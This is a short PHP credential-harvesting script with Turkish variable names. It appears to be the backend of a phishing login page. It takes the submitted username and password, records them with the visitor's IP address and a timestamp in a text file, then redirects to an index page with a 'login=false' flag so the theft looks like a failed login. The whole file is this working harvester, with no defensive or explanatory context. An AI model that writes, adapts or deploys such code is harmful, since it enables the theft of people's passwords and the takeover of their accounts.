<?php 

date_default_timezone_set('Europe/Istanbul');

$kullaniciadi = $_POST['uname'];
$sifre = $_POST['pwd'];
$ip =$_SERVER["REMOTE_ADDR"];
$tarih = date('d.m.Y - H:i');


$file = new SplFileObject("veriler.txt", "a");
$yaz=$tarih." - ".$kullaniciadi." - ".$sifre." - ".$ip."\n";
$file->fwrite($yaz);
header("Location: ../index.php?login=false");

 ?>